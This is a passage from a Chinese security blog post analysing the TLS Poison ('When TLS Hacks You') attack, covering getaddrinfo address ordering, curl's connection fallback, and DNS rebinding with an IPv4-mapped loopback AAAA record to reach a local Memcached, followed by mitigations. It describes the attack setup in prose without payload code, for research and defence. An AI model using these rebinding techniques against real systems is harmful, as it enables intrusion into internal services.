等相关文档进行了查找，但是并没有找到关于该现象的说明。如果有朋友知道该现象的原因或者相关信息的话，也欢迎提出评论。 Something elseBad-behaved Application在 RFC 6724 当中，有着这么一段话 ​ Well-behaved applications SHOULD NOT simply use the first address returned from an API such as getaddrinfo() and then give up if it fails. For many applications, it is appropriate to iterate through the list of addresses returned from getaddrinfo() until a working address is found. For other applications, it might be appropriate to try multiple addresses in parallel (e.g., with some small delay in between) and use the first one to succeed. 也就是说应用程序不应该简单地使用从 API（如getaddrinfo）返回的第一个地址，失败了就放弃改地址。对于许多应用程序来说，它们都选择从getaddrinfo返回的地址列表中进行挨个测试，直到找到一个正常的地址。对于其他应用程序，可能适合并行尝试多个地址（例如，中间有一些小的延迟），并使用第一个地址成功。(可能 Chrome 就是基于这个表现) 然而 curl 就是这么一个 Bad-behaved Application ，从getaddrinfo函数中取得的地址链表，依次挨个建立连接，一个不行就换下一个直到成功或链表为空为止。 Some History of getaddrinfo一段关于 getaddrinfo 排序有趣的历史，以下是个人对其抽取的理解，原文见：glibc’s getaddrinfo() sort order 在过去，主机名到 IP 地址的查询到一般都是用gethostbyname来完成的，gethostbyname的地址是按照服务器返回的地址顺序排列的（除非在本地做了特殊的配置）。当一个查询有多个地址时，基本上所有 NS 服务器都会安排对返回的地址进行”轮流 “或 “循环”：每个查询都会得到一个新的排序。这是为了让一个服务名可以引用多个物理网络接口（或许在不同的主机上），并在这些接口上分担负载，这就是所谓的 “基于DNS的负载均衡”。如果协议是像邮件这样的协议，如果第一个地址不成功，发送者可能会尝试多个地址，这也给了你一个故障转移(failover)。 gethostbyname 理论上可以支持 IPv6 ，但每次调用只能返回一种地址类型。虽然有一种方法可以将 IPv4 地址嵌入到 IPv6 地址中，但对于这样的情况，没有明确的方法告诉 gethostbyname ，调用的应用程序（以及应用程序所依赖的其他堆栈）将应对得到一堆 AF_INET6 而不是 AF_INET 的返回。因此对于 IPv6 ，需要一个新的接口。这个接口（在 RFC3493 s6.1和它的前身中定义）就是 getaddrinfo 。 它有几个新特性，其中大部分与这里无关。关键的新功能是：getaddrinfo 允许应用程序指定它是否只想获得 IPv4 地址，还是也想获得 IPv6 地址，如果获得混合的地址，那么是将其编码为 AF_INET ，还是将其编码为 “v6-mapped “AF_INET6（这里就是 IPv4-mapped IPv6 Addresses ）。结合其他各种新的特点，这使得将一个仅有 IPv4 的应用程序转换为 IPv6 功能变得相当简单。所以，总的来说：getaddrinfo 是用来取代 gethostbyname 的。 然而，另外，人们意识到，如果 getaddrinfo 可以返回 IPv4 和 v6 地址的混合物，那么有必要指定它们的返回顺序。当 RFC3484 编写时，作者显然认为最好的方法是在所有地址上定义一个比较函数，它将定义哪个地址是首选。 RFC3484 的作者不管上面所描述的对 DNS 循环功能的影响，指定（第6条规则9）所有地址应该按照与做出选择的主机的 “接近度 “进行排序–其中 “接近度 “被定义为普通初始地址前缀的长度。 这在 3484 制定之时，对于 IPv6 的真实网络近似性可能是一个有争议的定义，但现在很明显，在真实的IPv6互联网中，它不是这样的衡量标准，在IPv4互联网中也从来没有这样的衡量标准。所以 RFC3484 s6 规则 9 就是错误的，因为它背后的原因即使曾经适用现在也不再适用了。然而，比这更糟糕的是：规则 9。试图改变现有系统的行为。如果我们同意规则 9，那么它也应该同样适用于使用 gethostbyname。的应用程序。所有使用 gethostbyname 的现有应用程序都不符合规则9。也许可以修改 gethostbyname，使其根据 RFC3484 s5 和 s6 对地址进行排序。但这是一个好主意吗？不，显然不是。这将改变所有目前使用 gethostbyname 的应用程序的行为。目前，这些应用程序 “随机 “地选择地址（根据 DNS 循环）。规则 9 会让应用程序根据最长通用前缀来选择地址，这将破坏基于 DNS 的负载均衡机制。那么 getaddrinfo 呢？ 我们没有理由为了增加新功能彻底地改变该 API 。事实上，我们看到，我们自己服务器的 DNS 负载均衡已经被这个变化打破了! 也就是说，应用程序从使用非规则 9 的 gethostbyname 改为规则 9 的 getaddrinfo ，服务器会出现比较严重的非负载均衡。 RFC 试图规定以可预测的顺序返回地址是不合理的，因为几十年来整个互联网所依赖的既定行为是地址不是以可预测的顺序返回的，并且这里的不可预测性不是偶然的。在 DNS 轮询出现之前，地址总是按照 DNS 区域管理员指定的顺序返回，特殊的代码被添加到 namervers 中 (几十年前)，以 “随机化 “这个顺序。 getaddrinfo 不应该取消这个措施。正如上面所展示的，RFC是错误的，与现有的实践不一致，而且所提出的遵守它的方式导致我们有两个类似的接口（ gethostbyname 和 getaddrinfo ），它们的行为不一致，定义 getaddrinfo 的文档是 RFC 3493，而 RFC 3493 没有参考 RFC 3484 ，它根本没有提到排序。请注意，RFC3484 不是一个标准。它是一个 “proposed standard”–最早的 IETF 标准跟踪文件状态的东西。当然，我们应该建议 RFC3484 规则 9 应被废弃，并应被废除（IPv4 应该要废除这个规则，IPv6 可能也需要）。 Additional RemarksIPv4-Mapped 127.0.0.12021/05/14 更新： 对于 IPv4-mapped IPv6 这类地址，我认为并不是真正意义上的 v6 地址，真正 v6 的 loopback 地址为 ::1 ，IPv4-mapped IPv6 只是 IPv4 地址写成 IPv6 形式。那么既然并不是真正的 IPv6 ，但是写作了 IPv6 ，我觉得对于getaddrinfo来说，他确实是 IPv6 的结构，但是对于 IPv6 来说，真正的回环地址并不是这个，所以他可能被视为普通的 IPv6 地址处理。 我们可以简单验证一下自己的想法：直接在一个域名上同时设置 AAAA 记录为 ::ffff:7f00:0001 ，A 记录为随意一个 IPv4 公网地址。 使用 curl 请求我们设置的域名，得到的结果如下图所示： 可以看到，这两个地址是随机返回的。 并且我们也可以重新 debug 一遍 getaddrinfo 函数，验证一下自己的想法。于是，重新 debug 了一遍 libc 当中的 rfc3484_sort 函数，对于 ::ffff:7f00:0001 地址来说， getaddrinfo 使用了 IPv6 结构体处理这个地址，但是最后结果是按照 DNS 得到的原顺序返回，也就是说，这个地址与 IPv4 vps 地址一起出现时，对于getaddrinfo 来说是随机返回。所以从结果来看，他确实被视为了跟 v4 vps 相同优先级的地址。 但是我们实际上应不应该这么处理呢？按照 RFC 6742 的说法： ​ IPv4-compatible addresses [RFC4291], IPv4-mapped [RFC4291], IPv4-converted [RFC6145], IPv4-translatable [RFC6145], and 6to4 addresses [RFC3056] contain an embedded IPv4 address. For the purposes of this document, these addresses MUST be treated as having global scope. IPv4-mapped 这类地址应该被视为拥有 global scope ，而真正意义上的回环地址应该是被作为 link-local scope 处理的，这也就基本能解释为什么他会被作为与 v4 vps 这类地址一样的优先级了。 所以之前文中的说法不应该把 ::ffff:7f00:0001 与 127.0.0.1 视为同类地址，这一点是错误的。 IPv4-Mapped With Memcached2021/05/14 更新： 我们可以尝试一下使用 IPv4-Mapped 这类地址进行实验看看能不能写入 Memcached，同样的 DNS 配置：在一个域名上同时设置 AAAA 记录为 ::ffff:7f00:0001 ，A 记录为随意一个 IPv4 公网地址。 然后其他操作基本同双 A 记录实验方式一致，使用 proxy.py 拒绝客户端对 TLS 服务端的第二次请求以达到 DNS Rebinding 的效果，于是得到的实验结果如下图所示： 说明 Memcached 可以从 IPv4-Mapped 这类地址写入。 Mitigation纵观整个漏洞，我觉得其实造成这个漏洞是由于比较多复杂的因素导致的，从协议角度来说，在 RFC 当中也并没有提到 Client 到底应该怎么存储 Server 给予的相关凭证，也并没有说明清楚怎么与对应的 TLS 会话绑定，所以导致了 Client 在支持 TLS 会话重用的产生了各种实现；而从 Client 客户端漏洞来说，也是开发者们没有对进行 TLS 会话重用的地址进行二次校验，导致了可以使用 DNS Rebinding 来轻松绕过。 所以，对于该类漏洞首要的防护手段就是需要确认进行 TLS 会话重用的地址与之前的地址一致，而这个实现途径有很多种方式，比如说防御 DNS Rebinding 的方式能在一定程度上缓解到整个漏洞利用，但是对于 DNS Rebinding 的传统防守方式有些小伙伴可能会说 Client 只做一次 DNS 解析，之后就一直使用这个 IP 解析结果，但是如果 Client 存在像文中那样的挨个尝试建立连接后使用第一个连接成功的 IP 的现象的话，我们就可以使用上文提到的双 A 记录的方式来绕过该类限制。 那怎么做才是最好呢？作者在防御章节做出了自己阐述： 作者建议将 (hostname, port, ip_addr) 作为缓存键值对进行绑定，但是我个人认为这并不是一个良好的缓解措施，因为在当今 CDN 大流行的情况下，很难说这个域名会一直使用到同一个 IP ，如果将域名、端口、IP 三者绑定的话，对于 CDN 之类的服务会话重用机制消耗将会大大提升。 所以我觉得更好的做法应该是正如 Wiki 上介绍的，使用 IP 与对应的端口进行绑定 ： ​ The client associates this session id with the server’s IP address and TCP port, so that when the client connects again to that server, it can use the session id to shortcut the handshake. 使用 IP 与对应的端口作为缓存键值对进行绑定，这样的话就不会对 CND 之类的服务造成太大影响，而且也降低了被攻击的风险，就不会将重用会话发送到其他 IP 上了。当然这里也只是我个人片面的想法，可能还有很多这么做会受到影响的地方，比如说可能 Server 对于 Host 域名有校验而拒绝重用会话等等。所以，这里可能并没有一个十全十美的缓解该攻击方式的问题等等。 当然你也可以选择直接禁用掉 TLS 会话重用的功能，有些 Client 上就提供了 Disable outbound TLS session resumption 的设置（除了 chrome 等其他一些） ： libcurl: CURLOPT_SSL_SESSIONID_CACHE=false firefox: security.ssl.disable_session_identifiers=true Tor browser: disabled by default Java, Nodejs, Chrome, others: no option Conclusion整个漏洞弄下来还是非常有意思的，尽管其利用条件比较苛刻，需要有一个可以被攻击的服务 + Client 需要支持 TLS Session Resumption + DNS Rebinding（万一只查询一次 DNS 就没了），在当今全是从数学算法角度去 Hack TLS 的情况下，作者能从一个比较 Web 的角度来 Hack TLS ，我觉得是一个非常独到的视角，是非常值得学习的地方，尤其是这种协议设计的问题上。 还有，我觉得作者的标题也取的很棒，《When TLS Hacks You》，我们可以想一下为什么不是《When HTTPS Hacks You》呢？卖个关子，如果还有后续的进展，我也会同步到自己的个人博客上，欢迎关注，以及前来交流：https://blog.zeddyu.info/ 以上就是本篇文章的全部内容了，如果对该篇文章有任何疑问或者质疑，欢迎来信：echo emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d 欢迎大家指出文章的错误，也欢迎对协议安全等内容感兴趣的同学一起交流学习！ Acknowledgements非常感谢在整个流程中帮助我的同学、朋友们，特别感谢 @George 在调试过程中对于我这个萌新不耐我烦的帮助，感谢 @Joshua Maddux @zhaojin 等人在此前对该类型攻击做出的贡献，感谢 @rebirth @chuye 对本文的 Review 指出了本文之前不少的错误。 另外感谢一下小编负责且耐心的编辑，编辑这么长的文章真是辛苦小编了。 ReferencesWhen TLS Hacks You DEF CON Safe Mode - Joshua Maddux - When TLS Hacks You TLS Poison rustls RFC 5246: The Transport Layer Security (TLS) Protocol Version 1.2 RFC 5077: Transport Layer Security (TLS) Session Resumption without Server-Side State RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3 RFC 3484: Default Address Selection for Internet Protocol version 6 (IPv6) RFC 6724: Default Address Selection for Internet Protocol Version 6 (IPv6) Transport Layer Security TLS Stateful vs Stateless Session Resumption TLS Session Resumption Default destination address selection When TLS hacks you: TLS + SSRF = RCE by ducnt hxp 2020 基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华","link":"/2021/04/20/tls-poison/"}],"tags":[{"name":"wp","slug":"wp","link":"/tags/wp/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"php Reflect","slug":"php-Reflect","link":"/tags/php-Reflect/"},{"name":"Dev","slug":"Dev","link":"/tags/Dev/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"Flutter","slug":"Flutter","link":"/tags/Flutter/"},{"name":"Node.js","slug":"Node-js","link":"/tags/Node-js/"},{"name":"GitPack","slug":"GitPack","link":"/tags/GitPack/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"Sec","slug":"Sec","link":"/tags/Sec/"},{"name":"LFI","slug":"LFI","link":"/tags/LFI/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"端口扫描","slug":"端口扫描","link":"/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"},{"name":"sql注入","slug":"sql注入","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"karaf","slug":"karaf","link":"/tags/karaf/"},{"name":"Imagick","slug":"Imagick","link":"/tags/Imagick/"},{"name":"上传绕过","slug":"上传绕过","link":"/tags/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"name":"失效认证","slug":"失效认证","link":"/tags/%E5%A4%B1%E6%95%88%E8%AE%A4%E8%AF%81/"},{"name":"随机数问题","slug":"随机数问题","link":"/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98/"},{"name":"nosql注入","slug":"nosql注入","link":"/tags/nosql%E6%B3%A8%E5%85%A5/"},{"name":"验证码","slug":"验证码","link":"/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"name":"xxe","slug":"xxe","link":"/tags/xxe/"},{"name":"xpath","slug":"xpath","link":"/tags/xpath/"},{"name":"LDAP注入","slug":"LDAP注入","link":"/tags/LDAP%E6%B3%A8%E5%85%A5/"},{"name":"xss","slug":"xss","link":"/tags/xss/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"侧信道","slug":"侧信道","link":"/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"},{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php对象注入","slug":"php对象注入","link":"/tags/php%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"},{"name":"sqli报错注入","slug":"sqli报错注入","link":"/tags/sqli%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"sql约束攻击","slug":"sql约束攻击","link":"/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"Dev","slug":"Dev","link":"/categories/Dev/"},{"name":"Sec","slug":"Sec","link":"/categories/Sec/"}]}